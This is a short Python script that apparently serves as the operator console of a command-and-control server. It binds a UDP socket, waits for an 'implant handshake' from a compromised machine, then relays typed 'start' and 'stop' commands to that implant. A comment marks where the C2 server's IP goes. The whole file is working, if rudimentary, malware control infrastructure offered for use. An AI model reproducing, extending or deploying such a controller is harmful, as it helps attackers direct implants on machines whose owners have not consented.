import socket
from requests import get

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# ip = get('https://api.ipify.org').text
# print('My public IP address is:', ip)

ip = "0.0.0.0" # Replace with C2 server IP
port = 10101
addr = (ip, port)
sock.bind(addr)

print("Waiting for implant handshake")
msg, send_addr = sock.recvfrom(20)
commands = ["start", "stop"]

while True:
    cmd = input("cmd>")
    print(cmd)
    if cmd in commands:
        sock.sendto(cmd.encode(), send_addr)
    else:
        exit()
